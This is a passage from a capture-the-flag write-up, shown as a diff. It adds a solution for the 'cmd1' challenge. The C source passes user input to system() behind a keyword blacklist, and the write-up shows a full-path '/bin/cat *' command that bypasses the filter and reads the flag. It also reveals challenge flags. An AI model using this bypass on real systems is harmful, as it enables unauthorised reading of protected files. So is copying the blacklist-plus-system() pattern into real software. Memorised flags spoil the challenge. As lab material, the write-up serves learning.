@@ -288,3 +288,34 @@ while True:
 
 ```Flag : sorry mom... I FORGOT to check duplicate numbers... :( ```
  
+# cmd1
+```C
+#include <stdio.h>
+#include <string.h>
+
+int filter(char* cmd){
+	int r=0;
+	r += strstr(cmd, "flag")!=0;
+	r += strstr(cmd, "sh")!=0;
+	r += strstr(cmd, "tmp")!=0;
+	return r;
+}
+int main(int argc, char* argv[], char** envp){
+	putenv("PATH=/thankyouverymuch");
+	if(filter(argv[1])) return 0;
+	system( argv[1] );
+	return 0;
+}
+```
+The program is filtering out our input from ```flag, sh and tmp```
+<br>
+and setting the PATH environment variable to a non existing location in the root directory
+<br>
+to get the flag we have to use the binaries full path like ```/bin/cat``` accompanied with an asterix ```*```
+```assembly
+cmd1@ubuntu:~$ ./cmd1 "/bin/cat *" | /usr/bin/tail -n 1
+mommy now I get what PATH environment is for :)
+```
+
+```Flag : mommy now I get what PATH environment is for :)```
+
